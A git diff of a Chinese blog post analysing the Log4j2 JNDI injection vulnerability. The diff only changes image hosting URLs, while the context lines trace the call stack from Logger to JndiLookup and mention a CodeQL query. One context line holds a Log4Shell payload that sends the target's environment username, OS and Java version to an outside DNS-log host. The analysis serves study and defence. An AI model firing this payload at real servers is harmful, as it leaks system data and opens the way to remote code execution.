@@ -130,13 +130,13 @@ public class demo {
 
 
 
-![image-20211221165044511](https://cdn.jsdelivr.net/gh/SummerSec/Images/49u4249ec49u4249ec.png)
+![image-20211221165044511](https://img.sumsec.me//49u4249ec49u4249ec.png)
 
 ### 漏洞分析
 
 下面是这个漏洞触发的堆栈，分析漏洞触发的堆栈可以看出在哪触发的漏洞。
 
-![image-20211221165729926](https://cdn.jsdelivr.net/gh/SummerSec/Images/43u4243ec43u4243ec.png)
+![image-20211221165729926](https://img.sumsec.me//43u4243ec43u4243ec.png)
 
 可以发现0-11行是InitialContext.lookup触发JNDI漏洞的方式，可以直接删除。38-45行是spi接口转化也可以直接删除掉。
 ```
@@ -220,27 +220,27 @@ public class demo {
 
 org\apache\logging\log4j\core\Logger.class#log方法
 
-![image-20211221173425676](https://cdn.jsdelivr.net/gh/SummerSec/Images//37u3837ec/37u3837ec.png)
+![image-20211221173425676](https://img.sumsec.me///37u3837ec/37u3837ec.png)
 
 AwaitCompletionReliabilityStrategy.class#log方法会首先读取配置文件
 
-![image-20211222101833800](https://cdn.jsdelivr.net/gh/SummerSec/Images//40u1840ec40u1840ec.png)
+![image-20211222101833800](https://img.sumsec.me///40u1840ec40u1840ec.png)
 
 
 
 LoggerConfig.class#log方法，首先会进行一个properties判断，方法一共执行箭头三步然后调用另一个复写log方法。
 
-![image-20211222104135609](https://cdn.jsdelivr.net/gh/SummerSec/Images//35u4135ec35u4135ec.png)
+![image-20211222104135609](https://img.sumsec.me///35u4135ec35u4135ec.png)
 
-![image-20211222104828817](https://cdn.jsdelivr.net/gh/SummerSec/Images//28u4828ec28u4828ec.png)
+![image-20211222104828817](https://img.sumsec.me///28u4828ec28u4828ec.png)
 
 进入processLogEvent方法只会调用callAppenders方法
 
-![image-20211222105031335](https://cdn.jsdelivr.net/gh/SummerSec/Images//31u5031ec31u5031ec.png)
+![image-20211222105031335](https://img.sumsec.me///31u5031ec31u5031ec.png)
 
 callAppenders方法判断配置文件中日志输出位置，一般是控制台以及输出到文件，这里只配置了控制台。
 
-![image-20211222105610431](https://cdn.jsdelivr.net/gh/SummerSec/Images//10u5610ec10u5610ec.png)
+![image-20211222105610431](https://img.sumsec.me///10u5610ec10u5610ec.png)
 
 
 
@@ -328,7 +328,7 @@ protected void directEncodeEvent(LogEvent event) {
 }
 ```
 
-![image-20211222113029725](https://cdn.jsdelivr.net/gh/SummerSec/Images//29u3029ec29u3029ec.png)
+![image-20211222113029725](https://img.sumsec.me///29u3029ec29u3029ec.png)
 
 
 
@@ -376,7 +376,7 @@ public StringBuilder toSerializable(LogEvent event, StringBuilder buffer) {
 }
 ```
 
-![image-20211222142537774](https://cdn.jsdelivr.net/gh/SummerSec/Images//37u2537ec37u2537ec.png)
+![image-20211222142537774](https://img.sumsec.me///37u2537ec37u2537ec.png)
 
 
 
@@ -384,49 +384,49 @@ public StringBuilder toSerializable(LogEvent event, StringBuilder buffer) {
 
 MessagePatternConverter.class
 
-![image-20211222143251847](https://cdn.jsdelivr.net/gh/SummerSec/Images//52u3252ec52u3252ec.png)
+![image-20211222143251847](https://img.sumsec.me///52u3252ec52u3252ec.png)
 
-![image-20211222143404552](https://cdn.jsdelivr.net/gh/SummerSec/Images//4u344ec4u344ec.png)
+![image-20211222143404552](https://img.sumsec.me///4u344ec4u344ec.png)
 
 
 
 这里可以看出来为什么payload有**${}**字符串了，进入replace方法跳转到StrSubstitutor.class#replace
 
-![image-20211222143748258](https://cdn.jsdelivr.net/gh/SummerSec/Images//48u3748ec48u3748ec.png)
+![image-20211222143748258](https://img.sumsec.me///48u3748ec48u3748ec.png)
 
 
 
-![image-20211222144558770](https://cdn.jsdelivr.net/gh/SummerSec/Images//58u4558ec58u4558ec.png)
+![image-20211222144558770](https://img.sumsec.me///58u4558ec58u4558ec.png)
 
 StrSubstitutor.class#substitute方法可以发现为什么有那么多畸形的payload
 
-![image-20211222145801763](https://cdn.jsdelivr.net/gh/SummerSec/Images//2u582ec2u582ec.png)
+![image-20211222145801763](https://img.sumsec.me///2u582ec2u582ec.png)
 
 传入给resolveVariable方法参数值可以发现恶意payload已经传进来了
 
-![image-20211222150445643](https://cdn.jsdelivr.net/gh/SummerSec/Images//45u445ec45u445ec.png)
+![image-20211222150445643](https://img.sumsec.me///45u445ec45u445ec.png)
 
 
 
 resolver中有一个strLookupMap，可以发现执行各种协议，以及自定义的lookup方法。
 
-![image-20211222151238735](https://cdn.jsdelivr.net/gh/SummerSec/Images//38u1238ec38u1238ec.png)
+![image-20211222151238735](https://img.sumsec.me///38u1238ec38u1238ec.png)
 
 进入lookup方法到\org\apache\logging\log4j\core\lookup\Interpolator.class#lookup方法，首先会判断**env:OS**字符串的前缀长度env。
 
-![image-20211222151902111](https://cdn.jsdelivr.net/gh/SummerSec/Images//2u192ec2u192ec.png)
+![image-20211222151902111](https://img.sumsec.me///2u192ec2u192ec.png)
 
 
 
 Map会获取对应的lookup类，如果是env就是EnvironmentLookup类，JNDI就是JndiLookup，最终会调用对应方法，
 
-![image-20211222152008815](https://cdn.jsdelivr.net/gh/SummerSec/Images//9u209ec9u209ec.png)
+![image-20211222152008815](https://img.sumsec.me///9u209ec9u209ec.png)
 
 
 
 JNDilookup类会调用jndiManager#lookup方法，
 
-![image-20211222152719317](https://cdn.jsdelivr.net/gh/SummerSec/Images//19u2719ec19u2719ec.png)
+![image-20211222152719317](https://img.sumsec.me///19u2719ec19u2719ec.png)
 
 
 
@@ -454,7 +454,7 @@ ${jndi:ldap://${env:USERNAME}.${env:OS}.${sys:java.version}.dnslog.cn}
 
 如果ldap都不出网就gg。下图是log4j漏洞利用示例图，有点遗憾的是缺少一点本地反序列化流程。
 
-![image-20211222174953272](https://cdn.jsdelivr.net/gh/SummerSec/Images//53u4953ec53u4953ec.png)
+![image-20211222174953272](https://img.sumsec.me///53u4953ec53u4953ec.png)
 
 
 
@@ -537,13 +537,13 @@ select sink.getNode(), source, sink, "$@ flows to log4j call.", source.getNode()
 
 [lgtm for log4j2](https://lgtm.com/projects/g/apache/logging-log4j2/?mode=list&result_filter=0e00f5fa7b93849767c1677dc71d9400f85c6a54&severity=) 这个漏洞是**漏洞作者**当时看lgtm官方ql查询结果反推的。
 
-![image-20211223134932093](https://cdn.jsdelivr.net/gh/SummerSec/Images//32u4932ec32u4932ec.png)
+![image-20211223134932093](https://img.sumsec.me///32u4932ec32u4932ec.png)
 
 
 
 [LookupInterface](https://github.com/SummerSec/LookupInterface)此项目是当时我去看雪大会演讲时发起的一个项目，当时就发现了log4j2存在可以触发JNDI漏洞请求的类。也就是发现并公开这个sink，可惜当时想着是寻找jdk中Context替代类并没有进一步研究这个类在log4j2是否存在JNDI漏洞。（事后了解到这个sink在2020年的时候就被人ql规则到codeql了）
 
-![image-20211223112603446](https://cdn.jsdelivr.net/gh/SummerSec/Images//10u2610ec10u2610ec.png)
+![image-20211223112603446](https://img.sumsec.me///10u2610ec10u2610ec.png)
 
 
 
